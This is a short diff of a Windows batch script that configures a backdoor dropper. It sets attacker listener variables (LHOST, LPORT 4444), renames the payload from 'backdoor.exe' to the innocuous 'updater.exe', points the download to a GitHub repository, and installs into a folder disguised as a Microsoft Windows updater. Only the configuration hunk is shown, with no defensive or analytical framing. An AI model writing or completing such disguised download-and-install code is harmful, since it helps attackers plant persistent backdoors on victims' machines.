@@ -8,10 +8,10 @@
 setlocal enableDelayedExpansion
 
 REM Change these to your server's IP and file location
-set LHOST=[YOUR_IP]
-set LPORT=[YOUR_PORT]
-set FILENAME=backdoor.exe
-set FILEURL=http://%LHOST%/%FILENAME%
+set LHOST=
+set LPORT=4444
+set FILENAME='updater.exe'
+set FILEURL='https://github.com/H4ck3r-netizen/BD'
 set INSTALLDIR=%APPDATA%\Microsoft\Windows\Updater
 
 REM Create installation directory
